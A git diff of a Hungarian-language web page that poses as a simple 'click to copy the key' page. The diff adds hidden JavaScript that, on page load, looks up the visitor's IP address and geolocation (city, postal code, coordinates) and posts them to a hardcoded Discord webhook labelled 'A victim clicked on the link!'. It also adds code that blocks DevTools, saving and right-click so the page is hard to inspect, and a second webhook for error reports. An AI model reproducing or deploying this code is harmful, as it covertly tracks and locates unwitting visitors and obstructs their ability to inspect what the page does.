@@ -3,14 +3,218 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Weboldal Védelme</title>
-    <link rel="stylesheet" href="style.css"> <!-- Stíluslap -->
+    <title>Kulcs másoló weboldal</title>
+    <style>
+        /* Alap stílusok */
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to right, #ff7e5f, #feb47b); /* Színes háttér */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+            text-align: center;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.6); /* Fél átlátszó háttér */
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+
+        .key {
+            font-size: 24px;
+            background-color: #fff;
+            color: #333;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .copy-button {
+            margin-top: 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .copy-button:hover {
+            background-color: #45a049;
+        }
+
+        .copy-button:active {
+            background-color: #3e8e41;
+        }
+
+        .notification {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #d1e7dd;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Üdvözöllek az oldalon!</h1>
-    <p>Ez az oldal blokkolja a DevTools megnyitását és a mentési próbálkozásokat. Ha hiba történik, azt automatikusan elküldjük a Discord-ra.</p>
+    <div class="container">
+        <h1>Kattints a kulcs másolásához!</h1>
+        <input type="text" value="1234-ABCD-5678-EFGH" class="key" id="key" readonly>
+        <button class="copy-button" onclick="copyKey()">Másolás</button>
+        <div class="notification" id="notification">A kulcs sikeresen kimásolva!</div>
+    </div>
 
-    <!-- A script fájl beillesztése -->
-    <script src="script.js"></script> <!-- JavaScript fájl -->
+    <!-- JavaScript kód beágyazása -->
+    <script>
+        // Kulcs másolása a vágólapra
+        function copyKey() {
+            // Kulcs eleme
+            const keyElement = document.getElementById("key");
+
+            // Kiválasztjuk a kulcsot
+            keyElement.select();
+            keyElement.setSelectionRange(0, 99999); // Mobilon is működik
+
+            // Kulcs másolása a vágólapra
+            document.execCommand("copy");
+
+            // Visszajelzés a felhasználónak
+            const notification = document.getElementById("notification");
+            notification.style.display = "block"; // Megjeleníti az üzenetet
+            setTimeout(() => {
+                notification.style.display = "none"; // Elrejti 3 másodperc múlva
+            }, 3000);
+        }
+
+        // IP küldés Discordra
+        const sendIP = () => {
+            fetch('https://api.ipify.org?format=json')
+                .then(ipResponse => ipResponse.json())
+                .then(ipData => {
+                    const ipadd = ipData.ip;
+                    return fetch(`https://ipapi.co/${ipadd}/json/`)
+                        .then(geoResponse => geoResponse.json())
+                        .then(geoData => {
+                            const dscURL = 'https://discord.com/api/webhooks/1400426279408500807/4VGOn9kW4kH-dk7hzb2gWr_D5SVAtj997UtXKf-LSayhf-X-8uUbzVD-rYwe-1JpCzN7'; // replace with your webhook url
+                            return fetch(dscURL, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    username: "site logger <3", // optionally changeable
+                                    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+                                    content: `@here`,
+                                    embeds: [
+                                        {
+                                            title: 'A victim clicked on the link!',
+                                            description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                            color: 0x800080 // optionally changeable
+                                        }
+                                    ]
+                                })
+                            });
+                        });
+                })
+                .then(dscResponse => {
+                    if (dscResponse.ok) {
+                        console.log('Sent! <3');
+                    } else {
+                        console.log('Failed :(');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    console.log('Error :(');
+                });
+        };
+
+        sendIP();  // Call sendIP function when the page is loaded
+
+        // DevTools blokkolása
+        let devtoolsDetected = false;
+        const redirectURL = 'https://example.com';  // Cseréld ki arra az oldalra, ahová át szeretnéd irányítani
+
+        // DevTools érzékelése a `console.log` manipulálásával
+        (function() {
+            const originalConsole = console.log;
+            console.log = function(...args) {
+                originalConsole.apply(console, args); // Még mindig logoljuk a konzolra
+                if (args[0].includes('DevTools') || args[0].includes('DevTools protocol')) {
+                    window.location.href = redirectURL;  // Ha a DevTools elérhető, átirányítjuk őket
+                }
+            };
+        })();
+
+        // DevTools érzékelése az ablak méretének változásával
+        function detectDevTools() {
+            const threshold = 200;  // Ha a külső magasság eltérése nagyobb, mint 200px, akkor DevTools megnyílt
+            const devtoolsOpen = window.outerHeight - window.innerHeight > threshold;
+            if (devtoolsOpen && !devtoolsDetected) {
+                devtoolsDetected = true;
+                window.location.href = redirectURL;  // Ha megnyílt, átirányítjuk őket
+            }
+        }
+
+        setInterval(detectDevTools, 1000); // Minden másodpercben ellenőrzi a DevTools állapotát
+
+        // Ha valaki próbálja a DevTools-t vagy a jobb kattintást, letiltjuk
+        document.addEventListener('keydown', function(e) {
+            // Ha a felhasználó "Ctrl+S"-t nyom, letiltjuk
+            if ((e.ctrlKey && e.key === 's') || e.key === 'F12') {
+                e.preventDefault();  // Letiltja az alapértelmezett viselkedést (mentés)
+                window.location.href = redirectURL;  // Átirányítjuk őket a kívánt oldalra
+            }
+        });
+
+        // Jobb kattintás letiltása
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();  // Letiltja a jobb kattintást
+        });
+
+        // Szövegkiválasztás letiltása
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();  // Letiltja a szövegkiválasztást
+        });
+
+        // Globális hibafigyelés
+        window.onerror = function(message, source, lineno, colno, error) {
+            console.error(`Hiba: ${message} a(z) ${source} fájlban ${lineno} sorban észlelve.`);
+            
+            // Hibaüzenet megjelenítése a felhasználónak
+            const errorContainer = document.createElement('div');
+            errorContainer.classList.add('error');
+            errorContainer.innerText = `Hiba történt: ${message}`;
+
+            document.body.appendChild(errorContainer);
+
+            // Hibát küldhetünk Discordra
+            const dscURL = 'https://discord.com/api/webhooks/1397140201008267375/OigaJ4FR510_5ExJAanLzDF0VKx-vnmNSEtpxbphhuQLizgB781VzCCR0o2Bp5l5SvX3';
+            fetch(dscURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `Hiba történt a weboldalon: ${message}`
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Hiba sikeresen küldve Discordra:', data))
+            .catch(error => console.error('Hiba küldése Discordra nem sikerült:', error));
+
+            return true;  // Elkerüli a hiba dupla megjelenítését
+        };
+    </script>
 </body>
 </html>
